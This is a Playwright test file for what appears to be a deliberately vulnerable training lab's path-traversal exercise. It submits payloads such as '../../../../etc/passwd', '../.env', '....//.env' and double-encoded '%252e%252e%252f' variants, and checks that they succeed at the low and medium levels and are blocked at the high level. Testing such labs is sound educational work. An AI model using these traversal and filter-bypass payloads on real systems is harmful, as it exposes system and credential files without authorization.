const { test } = require("@playwright/test");
const { openLab, setLevel, expectDone, isDone, clearObjective, expect } = require("./helpers");

const fetchFile = async (page, f) => { await page.fill("#dl-file", f); await page.click("#dl-form button"); };

test.describe("Path traversal", () => {
  test.beforeEach(async ({ page }) => { await openLab(page, "path-traversal"); });

  test("Low: /etc/passwd and the .env file", async ({ page }) => {
    await setLevel(page, "low");
    await fetchFile(page, "../../../../etc/passwd");
    await expectDone(page, "pt-passwd");
    await fetchFile(page, "../.env");
    await expectDone(page, "pt-env");
  });

  test("Medium: ....// and double encoding bypass the filter", async ({ page }) => {
    await setLevel(page, "medium");
    await fetchFile(page, "../../../../etc/passwd");
    expect(await isDone(page, "pt-medium")).toBe(false);
    await fetchFile(page, "....//.env");
    await expectDone(page, "pt-medium");
    await clearObjective(page, "pt-medium");
    await fetchFile(page, "%252e%252e%252f.env");
    await expectDone(page, "pt-medium");
  });

  test("High: every traversal variant is contained", async ({ page }) => {
    await setLevel(page, "high");
    for (const p of ["../.env", "....//.env", "%2e%2e%2f.env", "%252e%252e%252f.env", "/etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd"]) {
      await fetchFile(page, p);
      await expect(page.locator("#dl-response"), p).toContainText("404");
    }
    await page.click('[data-file="employee-handbook.txt"]');
    await expect(page.locator("#dl-response")).toContainText("EMPLOYEE HANDBOOK");
  });
});
